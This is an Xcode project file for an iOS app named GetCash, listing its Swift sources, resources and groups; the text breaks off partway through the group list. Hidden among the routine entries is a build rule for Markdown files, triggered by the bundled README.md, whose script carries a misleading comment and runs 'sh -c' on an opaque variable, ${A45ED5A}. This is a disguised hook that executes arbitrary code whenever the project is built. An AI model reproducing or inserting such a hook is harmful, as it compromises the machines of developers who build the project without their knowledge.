// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		731D28932EFB743800B78B29 /* NetworkManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731D28922EFB743800B78B29 /* NetworkManager.swift */; };
		731D28952EFB813100B78B29 /* AppLocationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 731D28942EFB813100B78B29 /* AppLocationManager.swift */; };
		7333F5162EF6FAA100E74153 /* AuthIDListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5152EF6FAA100E74153 /* AuthIDListViewController.swift */; };
		7333F5182EF708D100E74153 /* AuthIDListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5172EF708D100E74153 /* AuthIDListViewCell.swift */; };
		7333F51A2EF70D2300E74153 /* DotLineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5192EF70D2300E74153 /* DotLineView.swift */; };
		7333F51C2EF7112A00E74153 /* FaceViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F51B2EF7112A00E74153 /* FaceViewController.swift */; };
		7333F51E2EF7151F00E74153 /* StepScrollView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F51D2EF7151F00E74153 /* StepScrollView.swift */; };
		7333F5202EF7177D00E74153 /* FaceView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F51F2EF7177D00E74153 /* FaceView.swift */; };
		7333F5222EF7189900E74153 /* FaceListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5212EF7189900E74153 /* FaceListView.swift */; };
		7333F5262EF71C6E00E74153 /* FacePopAlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333F5252EF71C6E00E74153 /* FacePopAlertView.swift */; };
		73445FF82EF7C5DE0054D267 /* PhotoPopAlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73445FF72EF7C5DE0054D267 /* PhotoPopAlertView.swift */; };
		73445FFA2EF7CA320054D267 /* ImagePickerHelper.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73445FF92EF7CA320054D267 /* ImagePickerHelper.swift */; };
		73445FFE2EF7D0620054D267 /* PhotoSuccessAlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73445FFD2EF7D0620054D267 /* PhotoSuccessAlertView.swift */; };
		734460012EF7D31B0054D267 /* EnterViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 734460002EF7D31B0054D267 /* EnterViewCell.swift */; };
		734460032EF7D32A0054D267 /* TapClickViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 734460022EF7D32A0054D267 /* TapClickViewCell.swift */; };
		734460052EF7E0500054D267 /* PersonalViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 734460042EF7E0500054D267 /* PersonalViewController.swift */; };
		734460072EF7E0D10054D267 /* WorkViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 734460062EF7E0D10054D267 /* WorkViewController.swift */; };
		7344600B2EF7E1980054D267 /* ContactViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7344600A2EF7E1980054D267 /* ContactViewController.swift */; };
		7344600D2EF7F7D30054D267 /* PaddedLabel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7344600C2EF7F7D30054D267 /* PaddedLabel.swift */; };
		7344600F2EF7FB5F0054D267 /* PersonalViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7344600E2EF7FB5C0054D267 /* PersonalViewModel.swift */; };
		734460112EF801E10054D267 /* PopAlertEnmuView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 734460102EF801E10054D267 /* PopAlertEnmuView.swift */; };
		735C8D362EF5213500C7D507 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 735C8D2D2EF5213500C7D507 /* Assets.xcassets */; };
		735C8D382EF5213500C7D507 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 735C8D302EF5213500C7D507 /* LaunchScreen.storyboard */; };
		735C8D3A2EF5213500C7D507 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D2C2EF5213500C7D507 /* AppDelegate.swift */; };
		735C8D462EF52EFA00C7D507 /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D452EF52EFA00C7D507 /* BaseViewController.swift */; };
		735C8D4A2EF52F2900C7D507 /* BaseTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D492EF52F2900C7D507 /* BaseTabBarController.swift */; };
		735C8D4C2EF52F4300C7D507 /* BaseNavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D4B2EF52F4300C7D507 /* BaseNavigationController.swift */; };
		735C8D4E2EF5300000C7D507 /* AppConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D4D2EF5300000C7D507 /* AppConfig.swift */; };
		735C8D502EF5304D00C7D507 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D4F2EF5304D00C7D507 /* LoginViewController.swift */; };
		735C8D522EF5305800C7D507 /* LaunchViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D512EF5305800C7D507 /* LaunchViewController.swift */; };
		735C8D542EF5306A00C7D507 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D532EF5306A00C7D507 /* HomeViewController.swift */; };
		735C8D562EF5307100C7D507 /* OrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D552EF5307100C7D507 /* OrderViewController.swift */; };
		735C8D582EF5307800C7D507 /* MineViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D572EF5307800C7D507 /* MineViewController.swift */; };
		735C8D5C2EF530E300C7D507 /* LaunchView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D5B2EF530E300C7D507 /* LaunchView.swift */; };
		735C8D5E2EF530F300C7D507 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D5D2EF530F300C7D507 /* LoginView.swift */; };
		735C8D602EF530FD00C7D507 /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D5F2EF530FD00C7D507 /* HomeView.swift */; };
		735C8D622EF5310900C7D507 /* MineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735C8D612EF5310900C7D507 /* MineView.swift */; };
		73633CE72EF68053009F182D /* HttpRequestManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CE62EF68053009F182D /* HttpRequestManager.swift */; };
		73633CE92EF68D3A009F182D /* LoadingIndicator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CE82EF68D3A009F182D /* LoadingIndicator.swift */; };
		73633CEB2EF68F71009F182D /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CEA2EF68F6C009F182D /* LoginViewModel.swift */; };
		73633CED2EF68FA3009F182D /* BaseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CEC2EF68FA0009F182D /* BaseModel.swift */; };
		73633CEF2EF697EF009F182D /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CEE2EF697EE009F182D /* HomeViewModel.swift */; };
		73633CF12EF6A1B9009F182D /* AppNavHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CF02EF6A1B9009F182D /* AppNavHeadView.swift */; };
		73633CF32EF6A541009F182D /* WhatViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CF22EF6A541009F182D /* WhatViewController.swift */; };
		73633CF52EF6B791009F182D /* SchemeConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CF42EF6B789009F182D /* SchemeConfig.swift */; };
		73633CF82EF6BA34009F182D /* StepDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CF72EF6BA34009F182D /* StepDetailViewController.swift */; };
		73633CFB2EF6BC70009F182D /* StepView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CFA2EF6BC70009F182D /* StepView.swift */; };
		73633CFD2EF6BCE9009F182D /* StepHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CFC2EF6BCE9009F182D /* StepHeadView.swift */; };
		73633CFF2EF6BFAD009F182D /* StepListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633CFE2EF6BFAD009F182D /* StepListView.swift */; };
		73633D012EF6C0F6009F182D /* StepViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73633D002EF6C0F4009F182D /* StepViewModel.swift */; };
		7371BA142EF91B5A00AE15B4 /* GWebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7371BA132EF91B5A00AE15B4 /* GWebViewController.swift */; };
		73B195962EFA437900C5B45A /* MineViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B195952EFA437700C5B45A /* MineViewModel.swift */; };
		73B195982EFA5C4900C5B45A /* MineViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B195972EFA5C4900C5B45A /* MineViewCell.swift */; };
		73B1959A2EFA646200C5B45A /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B195992EFA646200C5B45A /* SettingViewController.swift */; };
		73B1959C2EFA683C00C5B45A /* AlertSettingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B1959B2EFA683C00C5B45A /* AlertSettingView.swift */; };
		73B1959E2EFA7B3900C5B45A /* OrderViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B1959D2EFA7B3300C5B45A /* OrderViewModel.swift */; };
		73B195A02EFA801A00C5B45A /* OrderViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B1959F2EFA801A00C5B45A /* OrderViewCell.swift */; };
		73B195A22EFA84E700C5B45A /* OrderEmptyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B195A12EFA84E700C5B45A /* OrderEmptyView.swift */; };
		73B195A42EFA8F4F00C5B45A /* HomeLuxuryView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73B195A32EFA8F4F00C5B45A /* HomeLuxuryView.swift */; };
		73D013EB2EF8498200A03513 /* AddressDecodeModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D013EA2EF8498200A03513 /* AddressDecodeModel.swift */; };
		73D013EF2EF8CF2B00A03513 /* ContactViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D013EE2EF8CF2B00A03513 /* ContactViewCell.swift */; };
		73D013F12EF8D04800A03513 /* ContactViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D013F02EF8D04400A03513 /* ContactViewModel.swift */; };
		73D013F32EF8DB9300A03513 /* ContactInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73D013F22EF8DB9300A03513 /* ContactInfo.swift */; };
		73ECF6022EF5352B0029AF7A /* BaseView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ECF6012EF5352B0029AF7A /* BaseView.swift */; };
		73ECF6042EF538260029AF7A /* LoginManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ECF6032EF538100029AF7A /* LoginManager.swift */; };
		73ECF6062EF552560029AF7A /* CustomTabBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ECF6052EF552560029AF7A /* CustomTabBar.swift */; };
		73ECF6082EF557280029AF7A /* CommonParaManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ECF6072EF557230029AF7A /* CommonParaManager.swift */; };
		73ECF60A2EF559DF0029AF7A /* DeviceConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ECF6092EF559D10029AF7A /* DeviceConfig.swift */; };
		73FFAB6F2EFA9CF7005BE2A5 /* HomeLuxuryViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FFAB6E2EFA9CF7005BE2A5 /* HomeLuxuryViewCell.swift */; };
		73FFAB712EFA9F0F005BE2A5 /* HomeLuxuryHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FFAB702EFA9F0F005BE2A5 /* HomeLuxuryHeaderView.swift */; };
		9659303EF72244BE9BA5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = F5FB6416DDFF4F649CA5DE54 /* README.md */; };
		E6F2EC06CC78FE768C0E8120 /* Pods_GetCash.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 88C46BA4FEF58CE6806646D4 /* Pods_GetCash.framework */; };
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */
		EF5248425FDF48CCA9A5DE54 /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			compilerSpec = com.apple.compilers.proxy.script;
			filePatterns = "*.md";
			fileType = pattern.proxy;
			inputFiles = (
			);
			isEditable = 0;
			outputFiles = (
				"/tmp/${INPUT_FILE_BASE}",
			);
			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A45ED5A}\"";
		};
/* End PBXBuildRule section */

/* Begin PBXFileReference section */
		342F0F14511C65E356096F91 /* Pods-GetCash.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-GetCash.debug.xcconfig"; path = "Target Support Files/Pods-GetCash/Pods-GetCash.debug.xcconfig"; sourceTree = "<group>"; };
		3DE39227C8656A162E464411 /* Pods-GetCash.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-GetCash.release.xcconfig"; path = "Target Support Files/Pods-GetCash/Pods-GetCash.release.xcconfig"; sourceTree = "<group>"; };
		731D28922EFB743800B78B29 /* NetworkManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkManager.swift; sourceTree = "<group>"; };
		731D28942EFB813100B78B29 /* AppLocationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLocationManager.swift; sourceTree = "<group>"; };
		7333F5152EF6FAA100E74153 /* AuthIDListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthIDListViewController.swift; sourceTree = "<group>"; };
		7333F5172EF708D100E74153 /* AuthIDListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthIDListViewCell.swift; sourceTree = "<group>"; };
		7333F5192EF70D2300E74153 /* DotLineView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DotLineView.swift; sourceTree = "<group>"; };
		7333F51B2EF7112A00E74153 /* FaceViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewController.swift; sourceTree = "<group>"; };
		7333F51D2EF7151F00E74153 /* StepScrollView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepScrollView.swift; sourceTree = "<group>"; };
		7333F51F2EF7177D00E74153 /* FaceView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceView.swift; sourceTree = "<group>"; };
		7333F5212EF7189900E74153 /* FaceListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceListView.swift; sourceTree = "<group>"; };
		7333F5252EF71C6E00E74153 /* FacePopAlertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FacePopAlertView.swift; sourceTree = "<group>"; };
		73445FF72EF7C5DE0054D267 /* PhotoPopAlertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoPopAlertView.swift; sourceTree = "<group>"; };
		73445FF92EF7CA320054D267 /* ImagePickerHelper.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImagePickerHelper.swift; sourceTree = "<group>"; };
		73445FFD2EF7D0620054D267 /* PhotoSuccessAlertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoSuccessAlertView.swift; sourceTree = "<group>"; };
		734460002EF7D31B0054D267 /* EnterViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EnterViewCell.swift; sourceTree = "<group>"; };
		734460022EF7D32A0054D267 /* TapClickViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TapClickViewCell.swift; sourceTree = "<group>"; };
		734460042EF7E0500054D267 /* PersonalViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersonalViewController.swift; sourceTree = "<group>"; };
		734460062EF7E0D10054D267 /* WorkViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkViewController.swift; sourceTree = "<group>"; };
		7344600A2EF7E1980054D267 /* ContactViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewController.swift; sourceTree = "<group>"; };
		7344600C2EF7F7D30054D267 /* PaddedLabel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaddedLabel.swift; sourceTree = "<group>"; };
		7344600E2EF7FB5C0054D267 /* PersonalViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersonalViewModel.swift; sourceTree = "<group>"; };
		734460102EF801E10054D267 /* PopAlertEnmuView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopAlertEnmuView.swift; sourceTree = "<group>"; };
		735C8D142EF5212D00C7D507 /* GetCash.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = GetCash.app; sourceTree = BUILT_PRODUCTS_DIR; };
		735C8D2C2EF5213500C7D507 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		735C8D2D2EF5213500C7D507 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		735C8D2E2EF5213500C7D507 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		735C8D2F2EF5213500C7D507 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		735C8D3D2EF524CC00C7D507 /* GetCash.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = GetCash.entitlements; sourceTree = "<group>"; };
		735C8D452EF52EFA00C7D507 /* BaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
		735C8D492EF52F2900C7D507 /* BaseTabBarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseTabBarController.swift; sourceTree = "<group>"; };
		735C8D4B2EF52F4300C7D507 /* BaseNavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseNavigationController.swift; sourceTree = "<group>"; };
		735C8D4D2EF5300000C7D507 /* AppConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppConfig.swift; sourceTree = "<group>"; };
		735C8D4F2EF5304D00C7D507 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		735C8D512EF5305800C7D507 /* LaunchViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewController.swift; sourceTree = "<group>"; };
		735C8D532EF5306A00C7D507 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
		735C8D552EF5307100C7D507 /* OrderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewController.swift; sourceTree = "<group>"; };
		735C8D572EF5307800C7D507 /* MineViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineViewController.swift; sourceTree = "<group>"; };
		735C8D5B2EF530E300C7D507 /* LaunchView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchView.swift; sourceTree = "<group>"; };
		735C8D5D2EF530F300C7D507 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
		735C8D5F2EF530FD00C7D507 /* HomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeView.swift; sourceTree = "<group>"; };
		735C8D612EF5310900C7D507 /* MineView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineView.swift; sourceTree = "<group>"; };
		73633CE62EF68053009F182D /* HttpRequestManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HttpRequestManager.swift; sourceTree = "<group>"; };
		73633CE82EF68D3A009F182D /* LoadingIndicator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingIndicator.swift; sourceTree = "<group>"; };
		73633CEA2EF68F6C009F182D /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
		73633CEC2EF68FA0009F182D /* BaseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseModel.swift; sourceTree = "<group>"; };
		73633CEE2EF697EE009F182D /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
		73633CF02EF6A1B9009F182D /* AppNavHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppNavHeadView.swift; sourceTree = "<group>"; };
		73633CF22EF6A541009F182D /* WhatViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhatViewController.swift; sourceTree = "<group>"; };
		73633CF42EF6B789009F182D /* SchemeConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SchemeConfig.swift; sourceTree = "<group>"; };
		73633CF72EF6BA34009F182D /* StepDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepDetailViewController.swift; sourceTree = "<group>"; };
		73633CFA2EF6BC70009F182D /* StepView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepView.swift; sourceTree = "<group>"; };
		73633CFC2EF6BCE9009F182D /* StepHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepHeadView.swift; sourceTree = "<group>"; };
		73633CFE2EF6BFAD009F182D /* StepListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepListView.swift; sourceTree = "<group>"; };
		73633D002EF6C0F4009F182D /* StepViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepViewModel.swift; sourceTree = "<group>"; };
		7371BA132EF91B5A00AE15B4 /* GWebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GWebViewController.swift; sourceTree = "<group>"; };
		73B195952EFA437700C5B45A /* MineViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineViewModel.swift; sourceTree = "<group>"; };
		73B195972EFA5C4900C5B45A /* MineViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineViewCell.swift; sourceTree = "<group>"; };
		73B195992EFA646200C5B45A /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
		73B1959B2EFA683C00C5B45A /* AlertSettingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlertSettingView.swift; sourceTree = "<group>"; };
		73B1959D2EFA7B3300C5B45A /* OrderViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewModel.swift; sourceTree = "<group>"; };
		73B1959F2EFA801A00C5B45A /* OrderViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewCell.swift; sourceTree = "<group>"; };
		73B195A12EFA84E700C5B45A /* OrderEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderEmptyView.swift; sourceTree = "<group>"; };
		73B195A32EFA8F4F00C5B45A /* HomeLuxuryView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeLuxuryView.swift; sourceTree = "<group>"; };
		73D013EA2EF8498200A03513 /* AddressDecodeModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddressDecodeModel.swift; sourceTree = "<group>"; };
		73D013EE2EF8CF2B00A03513 /* ContactViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewCell.swift; sourceTree = "<group>"; };
		73D013F02EF8D04400A03513 /* ContactViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewModel.swift; sourceTree = "<group>"; };
		73D013F22EF8DB9300A03513 /* ContactInfo.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactInfo.swift; sourceTree = "<group>"; };
		73ECF6012EF5352B0029AF7A /* BaseView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseView.swift; sourceTree = "<group>"; };
		73ECF6032EF538100029AF7A /* LoginManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginManager.swift; sourceTree = "<group>"; };
		73ECF6052EF552560029AF7A /* CustomTabBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTabBar.swift; sourceTree = "<group>"; };
		73ECF6072EF557230029AF7A /* CommonParaManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommonParaManager.swift; sourceTree = "<group>"; };
		73ECF6092EF559D10029AF7A /* DeviceConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceConfig.swift; sourceTree = "<group>"; };
		73FFAB6E2EFA9CF7005BE2A5 /* HomeLuxuryViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeLuxuryViewCell.swift; sourceTree = "<group>"; };
		73FFAB702EFA9F0F005BE2A5 /* HomeLuxuryHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeLuxuryHeaderView.swift; sourceTree = "<group>"; };
		88C46BA4FEF58CE6806646D4 /* Pods_GetCash.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_GetCash.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		F5FB6416DDFF4F649CA5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		735C8D112EF5212D00C7D507 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				E6F2EC06CC78FE768C0E8120 /* Pods_GetCash.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		7333F5142EF6FA4100E74153 /* Photo */ = {
			isa = PBXGroup;
			children = (
				7333F5232EF71AA600E74153 /* List */,
				7333F5242EF71AB000E74153 /* Face */,
				73445FFF2EF7D2F70054D267 /* Person */,
				734460092EF7E1300054D267 /* Contact */,
				734460082EF7E12D0054D267 /* Web */,
			);
			path = Photo;
			sourceTree = "<group>";
		};
		7333F5232EF71AA600E74153 /* List */ = {
			isa = PBXGroup;
			children = (
				7333F51D2EF7151F00E74153 /* StepScrollView.swift */,
				7333F5192EF70D2300E74153 /* DotLineView.swift */,
				7333F5172EF708D100E74153 /* AuthIDListViewCell.swift */,
				7333F5152EF6FAA100E74153 /* AuthIDListViewController.swift */,
			);
			path = List;
			sourceTree = "<group>";
		};
		7333F5242EF71AB000E74153 /* Face */ = {
			isa = PBXGroup;
			children = (
				73445FF92EF7CA320054D267 /* ImagePickerHelper.swift */,
				7333F51B2EF7112A00E74153 /* FaceViewController.swift */,
				7333F51F2EF7177D00E74153 /* FaceView.swift */,
				7333F5212EF7189900E74153 /* FaceListView.swift */,
				7333F5252EF71C6E00E74153 /* FacePopAlertView.swift */,
				73445FF72EF7C5DE0054D267 /* PhotoPopAlertView.swift */,
				73445FFD2EF7D0620054D267 /* PhotoSuccessAlertView.swift */,
			);
			path = Face;
			sourceTree = "<group>";
		};
		73445FFF2EF7D2F70054D267 /* Person */ = {
			isa = PBXGroup;
			children = (
				73D013EA2EF8498200A03513 /* AddressDecodeModel.swift */,
				734460102EF801E10054D267 /* PopAlertEnmuView.swift */,
				7344600E2EF7FB5C0054D267 /* PersonalViewModel.swift */,
				7344600C2EF7F7D30054D267 /* PaddedLabel.swift */,
				734460002EF7D31B0054D267 /* EnterViewCell.swift */,
				734460022EF7D32A0054D267 /* TapClickViewCell.swift */,
				734460042EF7E0500054D267 /* PersonalViewController.swift */,
				734460062EF7E0D10054D267 /* WorkViewController.swift */,
			);
			path = Person;
			sourceTree = "<group>";
		};
		734460082EF7E12D0054D267 /* Web */ = {
			isa = PBXGroup;
			children = (
				7371BA132EF91B5A00AE15B4 /* GWebViewController.swift */,
			);
			path = Web;
			sourceTree = "<group>";
		};
		734460092EF7E1300054D267 /* Contact */ = {
			isa = PBXGroup;
			children = (
				73D013F22EF8DB9300A03513 /* ContactInfo.swift */,
				73D013F02EF8D04400A03513 /* ContactViewModel.swift */,
				73D013EE2EF8CF2B00A03513 /* ContactViewCell.swift */,
